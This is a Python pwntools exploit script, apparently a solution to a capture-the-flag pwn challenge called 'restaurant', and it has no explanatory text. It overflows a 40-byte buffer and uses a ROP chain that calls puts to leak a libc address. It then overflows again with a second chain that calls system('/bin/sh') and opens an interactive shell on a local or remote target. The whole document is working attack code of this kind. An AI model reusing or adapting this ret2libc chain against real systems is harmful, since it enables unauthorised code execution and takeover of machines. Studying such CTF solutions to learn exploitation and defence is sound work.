#!/usr/bin/env python3
from pwn import *
import sys

context.binary = elf = ELF("./restaurant", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'

if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    io = remote(ip, int(port))
else:
    io = process(elf.path)

# --- Stage 1: Leak Libc ---
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
main = elf.symbols['main']
offset = 40

payload = b"a" * offset
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(main)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", payload)

io.recvuntil(b"Enjoy your " + b"a" * offset)
io.recv(3)
leak_raw = io.recvline().strip()
leaked_puts = u64(leak_raw.ljust(8, b"\x00"))

libc.address = leaked_puts - libc.symbols.puts
log.success(f"Libc Base: {hex(libc.address)}")

# --- Stage 2 ---
ret = rop.find_gadget(["ret"]).address

payload = b"a" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols.system)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"> ", payload)

io.interactive()
